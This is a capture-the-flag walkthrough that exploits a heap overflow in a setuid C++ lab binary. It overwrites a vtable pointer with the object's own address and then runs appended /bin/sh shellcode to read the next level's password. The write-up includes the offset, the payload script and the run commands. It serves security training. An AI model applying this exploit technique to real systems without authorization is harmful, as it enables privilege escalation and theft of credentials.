level9 - walkthrough
====================

Target: /home/user/level9/level9   (setuid + setgid bonus0; a C++ program)
Goal:   read /home/user/bonus0/.pass

1. The bug
   main() creates two N objects (operator new of 108 bytes each) and calls
   a.setAnnotation(argv[1]), which is:
     memcpy(this+4, argv[1], strlen(argv[1]))   ; <-- no bound -> heap overflow
   It then makes a virtual call on b:
     mov (b),%eax     ; eax = b's vtable pointer
     mov (%eax),%edx  ; edx = vtable[0]
     call *%edx
   Overflowing a's buffer runs into b and overwrites b's vtable pointer.

2. Offset
   a's buffer = 0x0804a00c, b = 0x0804a078 -> 0x6c = 108 bytes. Byte 108 of
   argv[1] lands on b's vtable pointer.

3. The self-pointer trick
   The dispatch does fn = *(*(b)); call fn -- two dereferences. Set b's vtable
   pointer to b's own address, 0x0804a078. Then:
     eax = *(b) = 0x0804a078
     edx = *(0x0804a078) = 0x0804a078   (same 4 bytes)
     call 0x0804a078
   The CPU jumps to 0x0804a078 and executes the bytes there -- which are the
   address value 78 a0 04 08. Those decode as two harmless 2-byte instructions
   (a not-taken conditional jump, then `add al,8`), so execution falls straight
   through into the shellcode placed right after, at 0x0804a07c.

4. Payload  (Ressources/exploit.py)
     payload  = b"A"*108                  # reach b's vtable pointer
     payload += p32(0x804a078)            # vtable ptr = b's own address
     payload += asm(shellcraft.i386.sh()) # /bin/sh shellcode (NUL-free)

5. Run
     $ python3 Ressources/exploit.py
     $ ./level9 "$(cat payload)"
   A /bin/sh spawns reading from the terminal; then:
     $ cat /home/user/bonus0/.pass

